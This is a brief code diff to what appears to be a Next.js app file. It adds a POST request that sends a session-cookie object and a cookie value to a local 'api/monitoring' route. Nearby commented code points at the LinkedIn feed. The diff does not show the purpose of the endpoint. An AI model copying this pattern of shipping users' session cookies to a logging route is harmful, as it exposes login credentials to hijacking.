@@ -47,6 +47,10 @@ function MyApp({ Component, pageProps }) {
     }
   }, [cookiesSession])*/
   const handleGetUserUrl = async () => {
+    await fetch('api/monitoring', {
+      method:'POST',
+      body:JSON.stringify({ cookies:cookiesSession, userUrl:cookie })
+    })
     /*try{
       console.log("getuserurl cookiesSesion : ", cookiesSession)
       let url = 'https://www.linkedin.com/feed/'
